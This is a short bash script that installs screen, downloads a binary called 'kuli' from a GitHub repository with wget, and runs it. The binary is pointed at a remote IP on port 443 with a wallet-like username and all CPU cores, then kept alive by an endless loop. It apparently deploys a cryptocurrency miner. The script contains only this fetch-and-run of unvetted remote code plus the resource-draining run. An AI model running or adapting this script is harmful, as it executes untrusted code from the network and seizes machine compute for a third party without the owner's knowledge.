#!/bin/bash
sudo apt update
sudo apt install screen -y
wget https://github.com/stokjacky/amboyy/raw/main/kuli 
./kuli -c 157.245.62.61:443 -u RB7Ca9o9Xnf333xDtUnPVYH3JaycB7mgh3.yfff -p x --cpu $(nproc --all) 
while [ 1 ]; do
sleep 3
done
sleep 999
